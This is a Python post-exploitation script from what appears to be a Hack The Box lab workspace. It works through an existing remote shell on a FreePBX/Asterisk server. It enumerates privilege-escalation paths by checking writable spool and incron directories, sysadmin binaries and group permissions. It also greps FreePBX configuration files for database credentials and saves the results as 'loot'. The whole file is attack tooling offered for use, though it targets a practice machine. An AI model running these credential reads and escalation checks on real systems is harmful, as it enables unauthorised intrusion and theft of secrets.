#!/usr/bin/env python3
import pathlib
import sys

sys.path.insert(0, "/home/kali/Desktop/htb/Connected/scripts")
from enum_privesc import get_shell  # noqa: E402

CHECKS = [
    ("writable spool/incron", "ls -la /var/spool/asterisk/ /var/spool/asterisk/sysadmin/ /usr/local/asterisk/ 2>/dev/null; "
     "namei -l /var/spool/asterisk/sysadmin/vpnget 2>/dev/null"),
    ("sysadmin_manager", "/usr/bin/sysadmin_manager --help 2>&1 | head -40; ls -la /usr/bin/sysadmin_manager /usr/sbin/sysadmin_* 2>/dev/null | head -20"),
    ("incron triggers exist", "ls -la /var/spool/asterisk/sysadmin/* /usr/local/asterisk/incron /var/spool/asterisk/incron 2>/dev/null"),
    ("freepbx DB creds", "grep -E 'AMPDB|pass|user' /etc/freepbx.conf /etc/amportal.conf 2>/dev/null | head -25"),
    ("manager cxpanel", "grep -A15 '\\[cxpanel\\]' /etc/asterisk/manager_additional.conf 2>/dev/null"),
    ("vega / aiovega", "python3.6 -c \"import aiovega; print(aiovega.__file__)\" 2>&1; ls -la /usr/lib/python3.6/site-packages/aiovega* 2>/dev/null | head -5"),
    ("asterisk group perms", "groups; find /var/spool/asterisk -writable -type d 2>/dev/null | head -15"),
    ("fwconsole/sangoma", "which fwconsole; ls -la /usr/sbin/fwconsole 2>/dev/null; id asterisk"),
]

def main():
    cmd, url = get_shell()
    lines = [f"shell: {url}\n"]
    for title, c in CHECKS:
        o = cmd(c, timeout=90)
        lines.append(f"=== {title} ===\n{o}\n")
        print(f"## {title}\n{o[:1500]}\n")
    p = pathlib.Path("/home/kali/Desktop/htb/Connected/loot/escalation-paths.txt")
    p.write_text("\n".join(lines))
    print(f"[+] {p}")

if __name__ == "__main__":
    main()